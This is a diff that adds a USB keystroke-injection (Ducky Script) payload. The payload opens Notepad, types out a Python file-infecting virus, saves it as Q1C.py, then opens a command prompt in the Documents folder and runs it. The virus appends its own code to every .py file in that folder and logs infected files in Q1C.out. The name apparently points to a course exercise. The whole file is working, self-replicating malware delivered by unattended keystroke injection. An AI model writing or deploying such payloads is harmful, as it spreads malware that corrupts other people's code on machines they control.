@@ -1,0 +1,72 @@
+DELAY 500
+GUI r
+DELAY 500
+STRING notepad.exe
+ENTER
+DELAY 500
+STRING import sys
+ENTER
+DELAY 500
+STRING import glob
+ENTER
+DELAY 500
+STRING pyFiles = [f for f in glob.glob("*.py")] 
+ENTER
+DELAY 500
+STRING OutputFileExist = 'Q1C.out' in [f for f in glob.glob("*.out")]
+ENTER
+DELAY 500
+STRING for f in pyFiles:
+ENTER
+DELAY 500
+STRING    if OutputFileExist:
+ENTER
+DELAY 500
+STRING       infected = [line.strip() for line in open('Q1C.out', 'r').readlines()]
+ENTER
+DELAY 500
+STRING    else:
+ENTER
+DELAY 500
+STRING       with open('Q1C.out', 'w') as w:
+ENTER
+DELAY 500
+STRING          w.write('Q1C.py\n')
+ENTER
+DELAY 500
+STRING          infected = ['Q1C.py']
+ENTER
+DELAY 500
+STRING    if f not in infected:
+ENTER
+DELAY 500
+STRING       Q1CLines = ['\n'] + open('Q1C.py', 'r').readlines()
+ENTER
+DELAY 500
+STRING       with open(f, 'a') as modify, open('Q1C.out', 'a') as out:            
+ENTER
+DELAY 500
+STRING          for line in Q1CLines:
+ENTER
+DELAY 500
+STRING             modify.write(line)
+ENTER
+DELAY 500
+STRING          out.write(f + '\n')
+ENTER
+DELAY 500
+CTRL s
+DELAY 500
+STRING Q1C.py
+ENTER
+DELAY 500
+GUI r
+DELAY 500
+STRING CMD
+ENTER
+DELAY 500
+STRING cd documents
+ENTER
+DELAY 500
+STRING python3 Q1C.py
+ENTER
